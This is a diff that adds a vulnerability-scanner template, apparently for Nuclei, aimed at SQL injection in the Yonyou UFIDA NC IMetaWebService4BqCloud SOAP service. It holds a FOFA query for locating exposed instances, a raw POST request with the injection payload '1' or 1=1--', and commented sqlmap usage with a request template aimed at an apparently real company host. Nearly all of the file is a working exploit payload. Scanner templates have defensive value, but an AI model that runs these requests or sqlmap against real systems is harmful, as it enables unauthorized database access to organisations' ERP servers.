@@ -1,0 +1,59 @@
+id: yonyou-nc-IMetaWebService4BqCloud-sqli
+info:
+  name: 用友 UFIDA NC uap.pubitf.ae.meta.IMetaWebService4BqCloud - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou, sqli, oa,nc
+
+http:
+  - raw:
+      - |-
+        POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 330
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
+            <soapenv:Header/>
+            <soapenv:Body>
+            <imet:loadFields>
+                <imet:string>SmartModel^1' or 1=1--</imet:string>
+            </imet:loadFields>
+            </soapenv:Body>
+        </soapenv:Envelope>
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - design
+      - type: word
+        part: body
+        words:
+          - soap:Envelope
+
+# sqlmap -r sql.tst --batch
+# POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
+# Host: erp.kincang.com.cn:8001
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+# Connection: close
+# Content-Length: 330
+# Content-Type: text/xml;charset=UTF-8
+# Accept-Encoding: gzip
+
+# <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
+#     <soapenv:Header/>
+#     <soapenv:Body>
+#     <imet:loadFields>
+#         <imet:string>SmartModel^*--</imet:string>
+#     </imet:loadFields>
+#     </soapenv:Body>
+# </soapenv:Envelope>
